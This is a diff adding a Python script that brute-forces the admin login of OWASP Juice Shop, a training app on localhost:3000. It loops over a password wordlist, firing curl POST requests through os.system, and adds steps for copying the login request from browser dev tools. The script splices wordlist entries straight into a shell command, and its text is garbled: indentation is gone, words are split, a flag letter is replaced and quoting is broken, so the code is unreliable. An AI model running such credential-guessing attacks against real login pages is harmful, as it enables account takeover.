@@ -1,0 +1,21 @@
+import os
+with open("best1050.txt") as f:
+lines = f.readlines()
+for line in lines:
+line = line.replace("\n","")
+print("\nTrying + line)
+os.system("curl 'http://localhost:3000/rest/use r/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86 64 ; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: app lication/json, text/plain, */*' -H 'Accept-Language: en -US,en;q=0.5'-compressed -H 'Content-Type: applicatio n/json' -H 'Origin: http://localhost:3000' -H 'Connecti on: keep-alive' -H 'Referer: http://localhost:3000/' -Η 'Cookie: language=en; welcomebanner_status=dismiss' data-raw '{\"email\":\"admin@juice-sh.op\",\"password\" :\"" + line + "\"}"")
+
+How to fimd Curl Link - 
+
+1) Inspect the Login Page
+2) Go to Networks
+3) Use your email and a random password and proceed to login
+4) Ofcourse it will say login failed or incorrect password
+5) In Inspect Section in network you will get a post request 
+6) Now click on the request then right click on it -> Copy Url -> Copy as Curl
+
+
+
+###################################################################################################         IMPORTANT        #####################################################################################################################
+7) The link should be made changes as given in the above format itself or it wont work
